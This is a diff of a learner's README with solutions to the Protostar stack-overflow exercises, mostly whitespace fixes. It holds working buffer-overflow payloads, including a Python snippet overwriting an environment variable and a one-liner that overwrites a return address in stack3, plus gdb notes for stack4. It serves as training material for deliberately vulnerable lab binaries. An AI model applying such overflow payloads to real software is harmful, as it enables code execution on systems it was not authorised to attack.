@@ -1,4 +1,4 @@
-b# Protostar Solutions
+# Protostar Solutions
 - Inspired by Liveoverflow's solutions, meant to help me learn binary exploitation
 https://old.liveoverflow.com/binary_hacking/protostar/index.html
 https://github.com/z3tta/Exploit-Exercises-Protostar
@@ -10,12 +10,12 @@ https://github.com/z3tta/Exploit-Exercises-Protostar
 ## Stack 2
 Python program
 ```
-import 
+import
 os.environ['GREENIE']='AAAABBBBCCCCDDDD'*4+'\x0a\x0d\x0a\x0d'
 os.system('/opt/protostar/bin/stack2')
 ```
 
-## Stack 3 
+## Stack 3
 1. Use objdump to find memory address of the win function
 2. Find out the minimum amount of padding to get the program to crash (Just Manual Labour)
 3. Replace the padding with the memory address to overwrite it
@@ -25,7 +25,7 @@ python -c "print('A'*4*16+'\x24\x84\x04\x08')" | /opt/protostar/bin/stack3
 ```
 
 
-## Stack 4 
+## Stack 4
 Win function Memory Address at 0x080483f4.
 Using gdb to debug, The input text starts at 0xbffff7e0, ebp at 0xbffff828
 1. By brute forcing the padding, the program has no segmentation fault with maximum padding of about 'A'*4*18?
